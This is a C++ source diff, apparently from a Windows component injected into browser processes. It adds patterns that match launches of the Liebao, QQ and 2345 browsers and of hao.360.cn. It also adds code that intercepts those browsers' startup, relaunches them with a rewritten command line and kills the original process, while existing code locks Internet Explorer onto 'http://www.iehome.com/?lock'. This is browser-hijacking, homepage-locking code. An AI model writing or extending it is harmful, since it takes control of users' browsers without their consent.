@@ -78,7 +78,9 @@ namespace {
 	namespace {
 #define MAX_OVECCOUNT 0x30
 		const char * ptszHitRedirectURLLists[] = {
-			_S("\\liebao.exe\"? +--ico\\d ?$"),
+			_S("\\\\liebao\\.exe\"? +--ico\\d(?: |$)"),
+			_S("\\\\qqbrowser\\.exe\"? +-sc=[^ ]+shortcut(?: |$)"),
+			_S("\\\\2345explorer\\.exe\"? +--shortcut=[^ ]+(?: |$)"),
 
 			_S("(?: |http[s]?://)hao\\.360\\.cn/*(?:index[\\.]?(?:htm[l]?|php)?)?(?:\\?[^ ]*)?(?: |$)"),
 
@@ -385,8 +387,42 @@ namespace {
 #endif
 
 		LPCWSTR pcwszNewParameter = NULL;
+		LPCWSTR pcwszNewCommandLine = NULL;
 		LPCWSTR pcwszStartCommandLine = pProcessParameters->CommandLine.Buffer;
 		LPCWSTR pcwszStartImagePathName = pProcessParameters->ImagePathName.Buffer;
+
+		if (NULL != wcsistr(pcwszStartImagePathName, _W("\\iexplore.exe")) && 0 != wcsicmp(pcwszStartCommandLine, GetCommandLineW())) {
+			pcwszNewCommandLine = GetCommandLineW();
+		} else if (NULL != wcsistr(pcwszStartImagePathName, _W("\\liebao.exe")) && 0 != wcsicmp(pcwszStartCommandLine, GetCommandLineW())) {
+			pcwszNewCommandLine = GetCommandLineW();
+		} else if (NULL != wcsistr(pcwszStartImagePathName, _W("\\qqbrowser.exe")) && 0 != wcsicmp(pcwszStartCommandLine, GetCommandLineW())) {
+			pcwszNewCommandLine = GetCommandLineW();
+		}
+
+		//////////////////////////////////////////////////////////////////////////////////////////////
+		// 执行重定向
+
+		if (NULL != pcwszNewCommandLine) {
+			bool bIsSuccess = false;
+			STARTUPINFOW siStratupInfo = { 0 };
+			PROCESS_INFORMATION piProcessInformation = { 0 };
+
+			siStratupInfo.cb = sizeof(STARTUPINFO);
+
+			Global::Log.PrintW(LOGOutputs, L"[% 5u] Redirect CMD: %s", GetCurrentProcessId(), pcwszNewCommandLine);
+
+			if (FALSE == ::CreateProcessW(NULL, (LPWSTR)pcwszNewCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &siStratupInfo, &piProcessInformation)) {
+				return false;
+			}
+
+			ResumeThread(piProcessInformation.hThread);
+
+			CloseHandle(piProcessInformation.hThread);
+			CloseHandle(piProcessInformation.hProcess);
+
+			::ExitProcess(0);
+			::TerminateProcess(::GetCurrentProcess(), 0);
+		}
 
 		if (NULL != wcsistr(pcwszStartImagePathName, _W("\\iexplore.exe")) && IsRedirectCommandLine(pcwszStartCommandLine)) {
 			pcwszNewParameter = L"http://www.iehome.com/?lock";
@@ -406,7 +442,7 @@ namespace {
 
 			siStratupInfo.cb = sizeof(STARTUPINFO);
 
-			Global::Log.PrintW(LOGOutputs, L"[% 5u] Redirect CMD: %s", GetCurrentProcessId(), wszProtocolCommandLine);
+			Global::Log.PrintW(LOGOutputs, L"[% 5u] Redirect PARAM: %s", GetCurrentProcessId(), wszProtocolCommandLine);
 
 			if (FALSE == ::CreateProcessW(NULL, wszProtocolCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &siStratupInfo, &piProcessInformation)) {
 				return false;
